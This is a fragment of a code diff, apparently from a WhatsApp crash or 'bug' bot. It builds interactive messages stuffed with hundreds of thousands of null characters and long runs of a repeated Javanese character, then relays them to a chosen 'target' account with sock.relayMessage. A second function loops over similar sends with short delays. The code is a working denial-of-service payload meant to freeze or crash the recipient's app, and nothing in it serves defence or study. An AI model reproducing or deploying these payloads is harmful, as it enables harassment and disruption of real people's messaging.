+                                    buttonParamsJson: JSON.stringify({
+                                        icon: "\u0000".repeat(250000),
+                                        flow_cta: "ꦽ".repeat(25000),
+                                        flow_message_version: "3"
+                                    })
+                                },
+                                {
+                                    name: "galaxy_message",
+                                    buttonParamsJson: JSON.stringify({
+                                        icon: "\u0000".repeat(250000),
+                                        flow_cta: "ꦽ".repeat(25000),
+                                        flow_message_version: "3"
+                                    })
+                                }],
+                                messageParamsJson: "{}".repeat(25000)
+                            }
+                        }
+                    }
                 }
-              ],
-              messageParamsJson: "{}".repeat(25000)
             }
-          }
-        }
-      }
+        };
+        
+        await sock.relayMessage(target, VnXImg, {
+            messageId: null,
+            participant: { jid: target }
+        });
     }
-  };
-
-    await sock.relayMessage(target, VnXImg, {
-      messageId: null,
-      participant: { jid: target }
-    });
-  }
 }
 
 async function GmXTagSw(sock, target) {
@@ -4620,7 +4581,7 @@ async function GmXTagSw(sock, target) {
                 }
             }, { participant: { jid: target } })
             await delay(150)
-        } catch(e) {}
+        } catch (e) {}
     }
     
     for (let z = 0; z < 2; z++) {
